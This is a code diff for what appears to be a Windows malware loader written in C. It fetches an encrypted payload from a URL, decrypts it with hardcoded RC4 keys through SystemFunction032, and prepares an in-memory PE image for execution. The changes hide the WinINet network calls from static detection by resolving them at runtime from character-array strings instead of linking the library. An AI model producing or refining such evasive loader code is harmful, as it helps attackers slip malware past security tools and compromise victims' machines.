@@ -6,7 +6,7 @@
 #include "helpers.h"
 #include "antie.h"
 
-#pragma comment(lib, "wininet")
+//#pragma comment(lib, "wininet")
 
 #define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %d\n", cApiName, GetLastError())
 
@@ -17,16 +17,16 @@ SIZE_T g_sPeRXSize = 0;
 
 
 #define EXEC_WAIT 1
-#define RC4_KEY_SIZE 0x10 // 16
+#define KEY_SIZE 0x10 // 16
 
 BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
 {
 	//printf("[+] Performing initial decryption\n");
 	NTSTATUS STATUS = 0;
-	BYTE Rc4Key[RC4_KEY_SIZE] = { 0x47,0xa4,0xff,0xb2,0x89,0x67,0x30,0xe5,0x54,0xb0,0x28,0xbf,0x65,0xab,0xea,0x58 };
+	BYTE Rc4Key[KEY_SIZE] = { 0x47,0xa4,0xff,0xb2,0x89,0x67,0x30,0xe5,0x54,0xb0,0x28,0xbf,0x65,0xab,0xea,0x58 };
 
 	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
-	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };
+	USTRING uStringKey = { .Buffer = Rc4Key, .Length = KEY_SIZE, .MaximumLength = KEY_SIZE };
 
 	char sSystemFunction032[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', '\0' };
 
@@ -63,37 +63,63 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 	DWORD dwBytesRead = 0;
 	SIZE_T totalBytes = 0;
 
+	tLoadLibraryW pLoadLibraryW = (tLoadLibraryW)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+	HMODULE winMod = pLoadLibraryW(L"wininet.dll");
+	char sInternetCloseHandle[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0' };
+	tInternetCloseHandle pInternetCloseHandle = (tInternetCloseHandle)hlpGetProcAddress(winMod, sInternetCloseHandle);
+
+
 	BOOL isSuccess = TRUE;
+	char sInternetOpenA[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A', '\0'};
+
+	tInternetOpenA pInternetOpenA = (tInternetOpenA)hlpGetProcAddress(winMod, sInternetOpenA);
 	
-	if (!(hInternet = InternetOpenA(cUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)))
+	if (!(hInternet = pInternetOpenA(cUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)))
 	{
-		PRINT_WINAPI_ERR("InternetOpenA");
-		isSuccess = FALSE;
-		goto _FUNC_CLEANUP;
+		PRINT_WINAPI_ERR(sInternetOpenA);
+		return FALSE;
 	}
 
-	if (!(hInternetFile = InternetOpenUrlA(hInternet, sURL, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_NO_CACHE_WRITE, 0)))
+	char sInternetOpenUrlA[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'U', 'r', 'l', 'A', '\0' };
+
+	tInternetOpenUrlA pInternetOpenUrlA = (tInternetOpenUrlA)hlpGetProcAddress(winMod, sInternetOpenUrlA);
+
+	if (!(hInternetFile = pInternetOpenUrlA(hInternet, sURL, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_NO_CACHE_WRITE, 0)))
 	{
-		PRINT_WINAPI_ERR("InternetOpenUrlA");
-		isSuccess = FALSE;
-		goto _FUNC_CLEANUP;
+		PRINT_WINAPI_ERR(sInternetOpenA);
+		if (hInternet)
+			pInternetCloseHandle(hInternet);
+		if (hInternetFile)
+			pInternetCloseHandle(hInternetFile);
+		return FALSE;
 	}
 
 	lTempBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
 	if (!lTempBuffer)
 	{
-		isSuccess = FALSE;
-		goto _FUNC_CLEANUP;
+		if (hInternet)
+			pInternetCloseHandle(hInternet);
+		if (hInternetFile)
+			pInternetCloseHandle(hInternetFile);
+		return FALSE;
 	}
+
+
+	char sInternetReadFile[] = {'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
+
+	tInternetReadFile pInternetReadFile = (tInternetReadFile)hlpGetProcAddress(winMod, sInternetReadFile);
 
 	while (TRUE)
 	{
-		if (!InternetReadFile(hInternetFile, lTempBuffer, 1024, &dwBytesRead))
+		if (!pInternetReadFile(hInternetFile, lTempBuffer, 1024, &dwBytesRead))
 		{
-			PRINT_WINAPI_ERR("InternetReadFile");
+			PRINT_WINAPI_ERR(sInternetReadFile);
 			LocalFree(lBuffer);
-			isSuccess = FALSE;
-			goto _FUNC_CLEANUP;
+			if (hInternet)
+				pInternetCloseHandle(hInternet);
+			if (hInternetFile)
+				pInternetCloseHandle(hInternetFile);
+			return FALSE;
 		}
 
 		totalBytes += dwBytesRead;
@@ -108,8 +134,11 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 
 		if (!lBuffer)
 		{
-			isSuccess = FALSE;
-			goto _FUNC_CLEANUP;
+			if (hInternet)
+				pInternetCloseHandle(hInternet);
+			if (hInternetFile)
+				pInternetCloseHandle(hInternetFile);
+			return FALSE;
 		}
 
 		memcpy((PVOID)(lBuffer + (totalBytes - dwBytesRead)), lTempBuffer, dwBytesRead);
@@ -120,31 +149,29 @@ BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFile
 			break;
 	}
 
+	char sInternetSetOptionA[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', 'A', '\0' };
+	tInternetSetOptionA pInternetSetOptionA = (tInternetSetOptionA)hlpGetProcAddress(winMod, sInternetSetOptionA);
 
-	if (!InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0))
+	if (!pInternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0))
 	{
-		PRINT_WINAPI_ERR("InternetSetOptionA");
-		isSuccess = FALSE;
-		goto _FUNC_CLEANUP;
+		PRINT_WINAPI_ERR(sInternetSetOptionA);
+		if (hInternet)
+			pInternetCloseHandle(hInternet);
+		if (hInternetFile)
+			pInternetCloseHandle(hInternetFile);
+		return FALSE;
 	}
 
 	*ppBuffer = lBuffer;
 	*pdwFileSize = (DWORD)totalBytes;
 
-	InternetCloseHandle(hInternet);
-	InternetCloseHandle(hInternetFile);
+
+	pInternetCloseHandle(hInternet);
+	pInternetCloseHandle(hInternetFile);
 	//LocalFree(lBuffer);
 	LocalFree(lTempBuffer);
 
-	return isSuccess;
-
-_FUNC_CLEANUP:
-	if (hInternet)
-		InternetCloseHandle(hInternet);
-	if (hInternetFile)
-		InternetCloseHandle(hInternetFile);
-
-	return isSuccess;
+	return TRUE;
 }
 
 
@@ -352,9 +379,9 @@ BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtH
 BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL bDecrypt)
 {
 	NTSTATUS STATUS = 0;
-	BYTE Rc4Key[RC4_KEY_SIZE] = { 0x71,0x84,0x03,0x68,0x6a,0xe6,0xcf,0x8d,0x4a,0x8a,0xff,0x03,0x25,0x23,0x7d,0x75 };
+	BYTE Rc4Key[KEY_SIZE] = { 0x71,0x84,0x03,0x68,0x6a,0xe6,0xcf,0x8d,0x4a,0x8a,0xff,0x03,0x25,0x23,0x7d,0x75 };
 	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
-	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };
+	USTRING uStringKey = { .Buffer = Rc4Key, .Length = KEY_SIZE, .MaximumLength = KEY_SIZE };
 
 	HMODULE kern32 = hlpGetModuleHandle(L"kernel32.dll");
 
